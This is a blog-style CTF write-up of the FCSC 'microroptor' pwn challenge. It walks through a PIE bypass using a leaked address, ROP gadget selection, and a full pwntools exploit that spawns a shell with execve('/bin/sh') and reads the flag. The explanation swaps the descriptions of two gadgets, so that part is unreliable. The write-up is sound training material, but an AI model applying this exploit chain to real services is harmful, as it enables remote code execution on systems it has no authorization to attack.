---

layout: post
title: Microroptor, Hackropole CTF 
date: 30-07-2024
categories: [CTF, Challenge]
tag: [CTF, pwn, ROP, FCSC]  
author: Zélétix
---

## Enumerate binary

starting the challenge, we can already guess that the objective will likely involve `ROP`, given the binary's name and the challenge title `microROPtor`

When launching the vulnerable binary, we can see that it leaks an address:

```bash
attacker@attacker:~/chall/pwn$ ./microroptor
0x5a33dee3c010

Nope, you are no master.
attacker@attacker:~/chall/pwn$
```
Having completed a challenge on bypassing [PIE](https://www.redhat.com/en/blog/position-independent-executables-pie) the previous day, I immediately thought of this exploitation technique. To be sure, I checked the system protections:

```bash
attacker@attacker:~/chall/pwn$ pwn checksec --file=microroptor
[*] '/home/attacker/chall/pwn/microroptor'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
`PIE` is indeed `enabled`, and `NX` is also `enabled`, which prevents us from executing shellcode. Now, let's play around with the binary:

## Find Offset

Using `pwn cyclic` and `gdb-pwndbg`:

```bash
└─$ pwn cyclic 80
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
```
I found the correct offset:

```bash
*RBP  0x6161616a61616169 ('iaaajaaa')
*RSP  0x7fffffffdda8 ◂— 0x6161616c6161616b ('kaaalaaa')
*RIP  0x5555555551ed ◂— ret
```
```
└─$ pwn cyclic -l kaaalaaa
40
```

## Find Good gadgets

Now let's look for interesting gadgets in the binary using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget). Since we're doing ROP ([Return Oriented Programming](https://fr.wikipedia.org/wiki/Return-oriented_programming)), I'll filter out all gadgets ending with `ret`:

```bash
$ ROPgadget --binary microroptor | grep '; ret'
0x00000000000010d3 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret
0x00000000000011e8 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x00000000000010d4 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000000011e9 : add byte ptr [rax], al ; add cl, cl ; ret
0x00000000000011ea : add byte ptr [rax], al ; leave ; ret
0x00000000000010d6 : add byte ptr [rax], al ; ret
0x0000000000001115 : add byte ptr [rax], r8b ; ret
0x000000000000114d : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000000011eb : add cl, cl ; ret
0x0000000000001013 : add esp, 8 ; ret
0x0000000000001012 : add rsp, 8 ; ret
0x0000000000001234 : fisttp word ptr [rax - 0x7d] ; ret
0x0000000000001168 : in eax, 0x48 ; mov dword ptr [rdi], eax ; ret
0x00000000000011ec : leave ; ret
0x0000000000001111 : loopne 0x1179 ; nop dword ptr [rax + rax] ; ret
0x0000000000001148 : mov byte ptr [rip + 0x2ec9], 1 ; pop rbp ; ret
0x000000000000116a : mov dword ptr [rdi], eax ; ret
0x00000000000011e7 : mov eax, 0 ; leave ; ret
0x0000000000001167 : mov ebp, esp ; mov qword ptr [rdi], rax ; ret
0x0000000000001169 : mov qword ptr [rdi], rax ; ret
0x0000000000001166 : mov rbp, rsp ; mov qword ptr [rdi], rax ; ret
0x0000000000001175 : nop ; pop rbp ; ret
0x0000000000001113 : nop dword ptr [rax + rax] ; ret
0x00000000000010d1 : nop dword ptr [rax] ; ret
0x0000000000001112 : nop word ptr [rax + rax] ; ret
0x000000000000110f : or bh, bh ; loopne 0x1179 ; nop dword ptr [rax + rax] ; ret
0x0000000000001244 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001246 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001248 : pop r14 ; pop r15 ; ret
0x000000000000124a : pop r15 ; ret
0x000000000000116d : pop rax ; ret
0x0000000000001243 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001247 : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000000114f : pop rbp ; ret
0x000000000000116f : pop rdi ; ret
0x0000000000001171 : pop rdx ; ret
0x0000000000001249 : pop rsi ; pop r15 ; ret
0x0000000000001245 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001165 : push rbp ; mov rbp, rsp ; mov qword ptr [rdi], rax ; ret
0x000000000000100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000001255 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000001254 : sub rsp, 8 ; add rsp, 8 ; ret
```
And don't forget the syscall gadget (we'll come back to [execve](https://man7.org/linux/man-pages/man2/execve.2.html) later) :

```bash
└─$ ROPgadget --binary microroptor | grep 'syscall'
0x0000000000001173 : syscall
```
Unfortunately, the binary doesn't contain `/bin/sh` directly, but it has several interesting gadgets we can use to place `/bin/sh` in memory and execute it.

Here are three interesting gadgets to load `/bin/sh` into memory:

```bash
- 0x000000000000116f : pop rdi ; ret
- 0x0000000000001169 : mov qword ptr [rdi], rax ; ret
- 0x000000000000116d : pop rax ; ret
```
## Explanation of the gadgets:

  `0x000000000000116f: pop rdi ; ret`: This gadget allows us to control the `rdi` register, often used to point to a memory address where we want to write.

  `0x0000000000001169 : mov qword ptr [rdi], rax ; ret` : This gadget will load a value into the `rax` register, which is often used to hold the data we want to write to `memory`.

  `0x000000000000116d : pop rax ; ret` : This gadget allows us to write the value in `rax` to the address pointed to by `rdi`.

And three other gadgets for executing `/bin/sh`:
```bash
- 0x000000000000116f : pop rdi ; ret
- 0x0000000000001249 : pop rsi ; pop r15 ; ret
- 0x0000000000001171 : pop rdx ; ret
- 0x000000000000116d : pop rax ; ret
```
Before doing anything, we need to bypass `PIE` : 

## Bypass PIE Protection

When we run the script with `gdb-pwndbg`:
```bash
pwndbg> run
Starting program: /home/attacker/microroptor
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x555555558010
```

Thanks to Pwndbg, we can see the leak address, which this time will be fixed. Now, we just need to subtract it from the program's base address:

How do we see the program's base address? With GDB, we can simply use `vmmap` or, more verbosely, `info proc mappings`:

```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /home/attacker/microroptor
    0x555555555000     0x555555556000 r-xp     1000   1000 /home/attacker/microroptor
    0x555555556000     0x555555557000 r--p     1000   2000 /home/attacker/microroptor
    0x555555557000     0x555555558000 r--p     1000   2000 /home/attacker/microroptor
    0x555555558000     0x555555559000 rw-p     1000   3000 /home/attacker/microroptor

```
so with python we can do:

```python
>>> 0x555555558010 -  0x555555554000
16400
```
Perfect !! we have bypass the `PIE` 😎

## Construction du payload

Now that we have bypassed `PIE`, let's construct the payload using the identified gadgets. 

## Part 1: Load /bin/sh into Memory

To write `/bin/sh` to a controlled memory address, we use the following gadgets:

`pop rdi ; ret` to control the `rdi` register.

`pop rax ; ret` to load `/bin/sh` into `rax`.

`mov qword ptr [rdi], rax ; ret` to write the value in `rax` (i.e., `/bin/sh`) to the address pointed to by `rdi`.

```python
bin_sh_address = elf_address + 16480 
bin_sh_hex = u64(b"/bin/sh\x00")

rop = b"A" * 40
rop += p64(pop_rdi)
rop += p64(bin_sh_address)
rop += p64(pop_rax)
rop += p64(bin_sh_hex)
rop += p64(mov_rdi_rax)
```
## Part 2: Prepare Arguments for the execve System Call

To execute `/bin/sh`, we need to prepare the arguments for the `execve` system call. The `execve` system call requires three arguments:

    rdi: Pointer to /bin/sh
    rsi: Pointer to argv (argument array), can be NULL
    rdx: Pointer to envp (environment variable array), can be NULL

We use the following gadgets to prepare these arguments:

    pop rdi ; ret to load the address of /bin/sh into rdi.
    pop rsi ; pop r15 ; ret to load NULL into rsi.
    pop rdx ; ret to load NULL into rdx.
    pop rax ; ret to load the syscall number for execve (59) into rax.
    syscall to perform the system call.

.
```python
rop += p64(pop_rdi)
rop += p64(bin_sh_address)  
rop += p64(pop_rsi_pop_r15)
rop += p64(0)*2
rop += p64(pop_rdx)
rop += p64(0)  
rop += p64(pop_rax)
rop += p64(59) 
rop += p64(syscall)
```
Which results in: `execve("/bin/sh", NULL, NULL)`

FINAL EXPLOIT:

```python
from pwn import *

process = remote('localhost', 4000)

leak = process.recvline().decode().strip()
elf_address = int(leak, 16) - 16400

print(f"Leaked address: {leak}")
print(f"Calculated ELF base address: 0x{elf_address:x}")

pop_rax = elf_address + 0x000000000000116d
pop_rdi = elf_address + 0x000000000000116f
mov_rdi_rax = elf_address + 0x0000000000001169
syscall = elf_address + 0x0000000000001173
pop_rsi_pop_r15 = elf_address + 0x0000000000001249
pop_rdx = elf_address + 0x0000000000001171

bin_sh_address = elf_address + 16480

bin_sh_hex = u64(b"/bin/sh\x00")

rop = b"A" * 40
rop += p64(pop_rdi)
rop += p64(bin_sh_address)
rop += p64(pop_rax)
rop += p64(bin_sh_hex)
rop += p64(mov_rdi_rax)

rop += p64(pop_rdi)
rop += p64(bin_sh_address)
rop += p64(pop_rsi_pop_r15)
rop += p64(0)*2
rop += p64(pop_rdx)
rop += p64(0)
rop += p64(pop_rax)
rop += p64(59)
rop += p64(syscall)

process.sendline(rop)

process.interactive()
```
Once launched

```bash
└─$ python3 exploit.py
[+] Opening connection to localhost on port 4000: Done
Leaked address: 0x55b5365b2010
Calculated ELF base address: 0x55b5365ae000
[*] Switching to interactive mode
Nope, you are no master.
$ ls
flag
microroptor
$ cat flag
FCSC{e3752da07f2[....]cf36f9258}
$
```
 if you have any questions you can dm me on discord : "zeletix."